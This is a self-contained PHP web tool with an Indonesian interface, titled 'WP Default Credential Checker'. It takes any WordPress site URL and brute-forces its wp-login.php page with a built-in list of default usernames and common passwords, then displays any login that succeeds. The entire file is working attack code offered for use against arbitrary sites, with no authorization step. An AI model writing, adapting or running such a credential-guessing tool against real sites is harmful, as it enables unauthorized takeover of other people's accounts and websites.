<?php
set_time_limit(0);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $target = rtrim($_POST['target'], '/') . '/wp-login.php';
  $usernames = ['admin', 'administrator', 'root', 'wpadmin'];
  $passwords = ['admin', 'pass', 'admin123', '123456', '12345678', '123456789', 'password', '123123',
    'qwerty', 'letmein', 'test123', 'welcome', 'wordpress', 'wpadmin', 'root', 'abc123',
    'user123', '1234', 'pass123', 'admin@123', 'password123'];
  $success = [];

  foreach ($usernames as $username) {
    foreach ($passwords as $password) {
      $data = http_build_query([
        'log' => $username,
        'pwd' => $password,
        'wp-submit' => 'Log In',
        'redirect_to' => $target,
        'testcookie' => '1'
      ]);

      $opts = ['http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\nCookie: testcookie=1",
        'content' => $data,
        'ignore_errors' => true
      ]];

      $context = stream_context_create($opts);
      $result = @file_get_contents($target, false, $context);

      if ($result && strpos($result, 'wp-admin') !== false && strpos($result, 'dashboard') !== false) {
        $success[] = "✅ Berhasil login dengan <strong>$username</strong> / <strong>$password</strong>";
        break 2;
      }
    }
  }

  echo "<div class='mt-4'>";
  if (!empty($success)) {
    echo "<h5 class='text-success'>🎯 Login sukses!</h5><ul class='text-light'>";
    foreach ($success as $s) echo "<li>$s</li>";
    echo "</ul>";
  } else {
    echo "<div class='text-danger'>Tidak ada kredensial default yang berhasil login.</div>";
  }
  echo "</div>";
  exit;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>WP Default Credential Checker</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background-color: #121212; color: #f8f9fa; }
    .terminal { font-family: monospace; background: #1e1e1e; padding: 20px; border-radius: 10px; }
  </style>
</head>
<body>
<div class="container py-5">
  <h3 class="text-warning">🛑 WP Default Credential Checker</h3>
  <form method="POST" id="deffForm">
    <div class="mb-3">
      <input type="url" name="target" class="form-control" placeholder="Masukkan URL target WordPress" required>
    </div>
    <button class="btn btn-warning">Cek Default Login</button>
  </form>
  <div id="result" class="terminal mt-4"></div>
</div>
<script>
document.getElementById('deffForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  document.getElementById('result').innerHTML = '<span class="text-info">Memproses kombinasi default login...</span>';
  const formData = new FormData(this);
  const res = await fetch('', { method: 'POST', body: formData });
  document.getElementById('result').innerHTML = await res.text();
});
</script>
</body>
</html>
